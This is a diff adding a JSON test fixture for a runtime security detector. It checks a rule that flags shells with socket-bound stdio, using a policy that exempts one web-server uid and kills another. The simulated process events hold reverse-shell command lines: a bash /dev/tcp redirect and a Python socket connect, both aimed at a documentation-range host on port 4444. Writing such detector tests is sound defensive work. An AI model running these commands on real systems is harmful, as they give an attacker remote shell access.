@@ -1,0 +1,298 @@
+{
+ "about": "Lab PR 236: r020-shell-socket-stdio under a test policy `enforce R020` with `exempt R020 uid 33`: the reverse shells of the web server (uid 33) are exempt — recorded only (mode exempt, Log); a second web server run as uid 34 gets R020's kill (enforce). Exemptions never go by process name.",
+ "fires": [
+  "R020_ShellWithSocketStdio"
+ ],
+ "held": [],
+ "items": [
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 5700001,
+     "ppid": 1,
+     "uid": 33,
+     "gid": 33,
+     "comm": "apache2",
+     "filename": "/usr/sbin/apache2",
+     "timestamp_ns": 500000000000,
+     "argv": [
+      "/usr/sbin/apache2",
+      "-k",
+      "start"
+     ],
+     "parent_comm": "",
+     "start_ns": 499999000000,
+     "exe": {
+      "path": "/usr/sbin/apache2"
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 5700002,
+     "ppid": 5700001,
+     "uid": 33,
+     "gid": 33,
+     "comm": "sh",
+     "filename": "/usr/bin/dash",
+     "timestamp_ns": 3600000000000,
+     "argv": [
+      "sh",
+      "-c",
+      "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"
+     ],
+     "parent_comm": "apache2",
+     "start_ns": 3599999000000,
+     "exe": {
+      "path": "/usr/bin/dash"
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 5700003,
+     "ppid": 5700002,
+     "uid": 33,
+     "gid": 33,
+     "comm": "bash",
+     "filename": "/usr/bin/bash",
+     "timestamp_ns": 3600001000000,
+     "argv": [
+      "bash",
+      "-i"
+     ],
+     "parent_comm": "sh",
+     "start_ns": 3600000000000,
+     "exe": {
+      "path": "/usr/bin/bash"
+     },
+     "stdio": {
+      "own": {
+       "read": true,
+       "inet_fds": 3,
+       "outbound": true,
+       "proto": 6,
+       "peer": "203.0.113.7:4444"
+      },
+      "parent": {
+       "read": true,
+       "inet_fds": 0,
+       "outbound": false,
+       "proto": 0,
+       "peer": null
+      }
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 5700011,
+     "ppid": 5700002,
+     "uid": 33,
+     "gid": 33,
+     "comm": "python3",
+     "filename": "/usr/bin/python3",
+     "timestamp_ns": 3610000000000,
+     "argv": [
+      "python3",
+      "-c",
+      "import socket,os,pty;s=socket.socket();s.connect(('203.0.113.7',4444))"
+     ],
+     "parent_comm": "sh",
+     "start_ns": 3609999000000,
+     "exe": {
+      "path": "/usr/bin/python3"
+     },
+     "stdio": {
+      "own": {
+       "read": true,
+       "inet_fds": 3,
+       "outbound": true,
+       "proto": 6,
+       "peer": "203.0.113.7:4444"
+      },
+      "parent": {
+       "read": true,
+       "inet_fds": 0,
+       "outbound": false,
+       "proto": 0,
+       "peer": null
+      }
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 5700012,
+     "ppid": 5700011,
+     "uid": 33,
+     "gid": 33,
+     "comm": "bash",
+     "filename": "/usr/bin/bash",
+     "timestamp_ns": 3610002000000,
+     "argv": [
+      "/bin/bash"
+     ],
+     "parent_comm": "python3",
+     "start_ns": 3610001000000,
+     "exe": {
+      "path": "/usr/bin/bash"
+     },
+     "stdio": {
+      "own": {
+       "read": true,
+       "inet_fds": 0,
+       "outbound": false,
+       "proto": 0,
+       "peer": null
+      },
+      "parent": {
+       "read": true,
+       "inet_fds": 3,
+       "outbound": true,
+       "proto": 6,
+       "peer": "203.0.113.7:4444"
+      }
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 5700021,
+     "ppid": 1,
+     "uid": 0,
+     "gid": 0,
+     "comm": "bash",
+     "filename": "/usr/bin/bash",
+     "timestamp_ns": 3620000000000,
+     "argv": [
+      "/usr/bin/bash",
+      "/usr/lib/golden/echo-service"
+     ],
+     "parent_comm": "systemd",
+     "start_ns": 3619999000000,
+     "exe": {
+      "path": "/usr/bin/bash"
+     },
+     "stdio": {
+      "own": {
+       "read": true,
+       "inet_fds": 3,
+       "outbound": false,
+       "proto": 6,
+       "peer": "198.51.100.20:51000"
+      },
+      "parent": {
+       "read": true,
+       "inet_fds": 0,
+       "outbound": false,
+       "proto": 0,
+       "peer": null
+      }
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 5700101,
+     "ppid": 1,
+     "uid": 34,
+     "gid": 34,
+     "comm": "apache2",
+     "filename": "/usr/sbin/apache2",
+     "timestamp_ns": 20500000000000,
+     "argv": [
+      "/usr/sbin/apache2",
+      "-k",
+      "start"
+     ],
+     "parent_comm": "",
+     "start_ns": 20499999000000,
+     "exe": {
+      "path": "/usr/sbin/apache2"
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 5700102,
+     "ppid": 5700101,
+     "uid": 34,
+     "gid": 34,
+     "comm": "sh",
+     "filename": "/usr/bin/dash",
+     "timestamp_ns": 23600000000000,
+     "argv": [
+      "sh",
+      "-c",
+      "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"
+     ],
+     "parent_comm": "apache2",
+     "start_ns": 23599999000000,
+     "exe": {
+      "path": "/usr/bin/dash"
+     }
+    }
+   }
+  },
+  {
+   "event": {
+    "ProcessSpawn": {
+     "pid": 5700103,
+     "ppid": 5700102,
+     "uid": 34,
+     "gid": 34,
+     "comm": "bash",
+     "filename": "/usr/bin/bash",
+     "timestamp_ns": 23600001000000,
+     "argv": [
+      "bash",
+      "-i"
+     ],
+     "parent_comm": "sh",
+     "start_ns": 23600000000000,
+     "exe": {
+      "path": "/usr/bin/bash"
+     },
+     "stdio": {
+      "own": {
+       "read": true,
+       "inet_fds": 3,
+       "outbound": true,
+       "proto": 6,
+       "peer": "203.0.113.7:4444"
+      },
+      "parent": {
+       "read": true,
+       "inet_fds": 0,
+       "outbound": false,
+       "proto": 0,
+       "peer": null
+      }
+     }
+    }
+   }
+  }
+ ],
+ "policy": "enforce R020\nexempt R020 uid 33\n",
+ "enforced": [
+  "R020_ShellWithSocketStdio"
+ ],
+ "exempt": [
+  "R020_ShellWithSocketStdio"
+ ]
+}
